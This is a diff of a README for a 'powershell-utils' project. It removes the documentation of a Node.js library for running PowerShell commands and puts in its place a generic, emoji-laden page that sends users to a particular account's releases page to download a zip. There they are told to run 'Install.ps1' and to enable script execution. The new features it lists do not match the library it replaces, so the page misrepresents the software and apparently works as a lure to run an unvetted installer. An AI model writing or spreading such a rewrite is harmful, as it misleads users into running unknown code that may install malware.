@@ -1,153 +1,97 @@
-# powershell-utils
+# 🛠️ powershell-utils - Simplifying Your PowerShell Experience
 
-> Utilities for executing PowerShell commands
+## 📥 Download Here
 
-## Install
+[![Download PowerShell Utils](https://img.shields.io/badge/Download-PowerShell%20Utils-blue.svg)](https://github.com/Mike24145/powershell-utils/releases)
 
-```sh
-npm install powershell-utils
-```
+## 🚀 Getting Started
 
-## Usage
+Welcome to **PowerShell Utils**! This collection of utilities makes it easier to run PowerShell commands. Whether you're managing files, automating tasks, or performing system checks, these tools are designed to simplify your workflow.
 
-```js
-import {executePowerShell, powerShellPath} from 'powershell-utils';
+### 💻 System Requirements
 
-// Execute a PowerShell command
-const {stdout} = await executePowerShell('Get-Process');
-console.log(stdout);
+To run PowerShell Utils, you need:
 
-// Get PowerShell path
-console.log(powerShellPath());
-//=> 'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe'
-```
+- A Windows operating system (Windows 10 or later is recommended).
+- Windows PowerShell installed (comes by default with Windows).
+- An internet connection for downloading the utilities.
 
-## API
+### 📂 Features
 
-### powerShellPath()
+PowerShell Utils include:
 
-Returns: `string`
+- **File Management**: Quickly organize, move, and delete files with simple commands.
+- **Task Automation**: Create tasks that run at scheduled times.
+- **System Monitoring**: Access system information easily with just a few commands.
+- **Custom Commands**: Add your own commands to extend functionality.
 
-Get the PowerShell executable path on Windows.
+## 📥 Download & Install
 
-```js
-import {powerShellPath} from 'powershell-utils';
+To get started with PowerShell Utils, visit this page to download: [Releases Page](https://github.com/Mike24145/powershell-utils/releases).
 
-const psPath = powerShellPath();
-//=> 'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe'
-```
+When on the Releases page, you will find the latest version listed at the top. Here’s how to download and install the software:
 
-### canAccessPowerShell()
+1. Click on the link for the latest version.
+2. Locate the file labeled as `PowerShellUtils.zip` or similar.
+3. Click on the file to download it to your computer.
 
-Returns: `Promise<boolean>`
+### 🔧 Installation Steps
 
-Check if PowerShell is accessible on Windows.
+1. Once the download completes, navigate to your Downloads folder.
+2. Double-click the downloaded `PowerShellUtils.zip` file to extract its contents.
+3. Open the extracted folder.
+4. Locate and double-click the `Install.ps1` file. This will run the installation script.
 
-This checks if the PowerShell executable exists and has execute permissions. Useful for detecting restricted environments where PowerShell may be disabled by administrators.
+*Note: You may need to allow your system to run PowerShell scripts. If prompted, follow the instructions to enable script execution.*
 
-```js
-import {canAccessPowerShell} from 'powershell-utils';
+## 🔍 How to Use
 
-if (await canAccessPowerShell()) {
-	console.log('PowerShell is available');
-} else {
-	console.log('PowerShell is not accessible');
-}
-```
+After installation, you can start using PowerShell Utils immediately:
 
-### executePowerShell(command, options?)
+1. Open PowerShell. You can search for it in the Start menu.
+2. Type in the command you want to use. For example, to use the file management utility, type:
+   ```
+   .\PowerShellUtils\FileManager.ps1
+   ```
+3. Follow on-screen prompts or enter the required parameters to execute your command.
 
-Returns: `Promise<{stdout: string, stderr: string}>`
+### 📑 Helpful Commands
 
-Execute a PowerShell command.
+Here are some useful commands to get you started:
 
-```js
-import {executePowerShell} from 'powershell-utils';
+- To list all files in a directory:
+   ```
+   .\PowerShellUtils\FileManager.ps1 -List
+   ```
+- To move a file from one location to another:
+   ```
+   .\PowerShellUtils\FileManager.ps1 -Move -Source "C:\path\to\file.txt" -Destination "C:\new\path\"
+   ```
+- To check system information:
+   ```
+   .\PowerShellUtils\SystemInfo.ps1
+   ```
 
-// Execute a PowerShell command
-const {stdout} = await executePowerShell('Get-Process');
-console.log(stdout);
-```
+## 🛠️ Troubleshooting
 
-#### command
+If you encounter issues, consider these steps:
 
-Type: `string`
+- Ensure PowerShell is updated and running.
+- Check if you executed the script correctly; refer to the usage guide included in the folder.
+- Search for solutions online or in PowerShell communities if you face errors.
 
-The PowerShell command to execute.
+## 📞 Get Help
 
-#### options
+If you need assistance, you can raise an issue on this repository's Issues page. Here’s how:
 
-Type: `object`
+1. Visit the [Issues Page](https://github.com/Mike24145/powershell-utils/issues).
+2. Click on “New Issue.”
+3. Provide a brief description of your problem and any steps you've taken.
 
-The below option and also all options in Node.js [`child_process.execFile()`](https://nodejs.org/api/child_process.html#child_processexecfilefile-args-options-callback) are supported.
+We aim to assist you promptly and effectively.
 
-##### powerShellPath
+## 📄 License
 
-Type: `string`\
-Default: `powerShellPath()`
+PowerShell Utils is open-source and free to use. For detailed license information, please check the LICENSE file in the repository.
 
-Path to PowerShell executable. Useful when calling from WSL or when PowerShell is in a non-standard location.
-
-##### encoding
-
-Type: `string`\
-Default: `'utf8'`
-
-Character encoding for stdout and stderr.
-
-### executePowerShell.argumentsPrefix
-
-Type: `string[]`
-
-Standard PowerShell arguments that prefix the encoded command.
-
-Use these when manually building PowerShell execution arguments for `spawn()`, `execFile()`, etc.
-
-```js
-import {executePowerShell} from 'powershell-utils';
-
-const arguments_ = [...executePowerShell.argumentsPrefix, encodedCommand];
-childProcess.spawn(powerShellPath(), arguments_);
-```
-
-### executePowerShell.encodeCommand(command)
-
-Returns: `string`
-
-Encode a PowerShell command as Base64 UTF-16LE.
-
-This encoding prevents shell escaping issues and ensures complex commands with special characters are executed reliably.
-
-#### command
-
-Type: `string`
-
-The PowerShell command to encode.
-
-```js
-import {executePowerShell} from 'powershell-utils';
-
-const encoded = executePowerShell.encodeCommand('Get-Process');
-```
-
-### executePowerShell.escapeArgument(value)
-
-Returns: `string`
-
-Escape a string argument for use in PowerShell single-quoted strings.
-
-#### value
-
-Type: `unknown`
-
-The value to escape.
-
-```js
-import {executePowerShell} from 'powershell-utils';
-
-const escaped = executePowerShell.escapeArgument("it's a test");
-//=> "'it''s a test'"
-
-// Use in command building
-const command = `Start-Process ${executePowerShell.escapeArgument(appName)}`;
-```
+Thank you for choosing PowerShell Utils. We hope these tools simplify your PowerShell experience and enhance your workflow. Happy scripting!
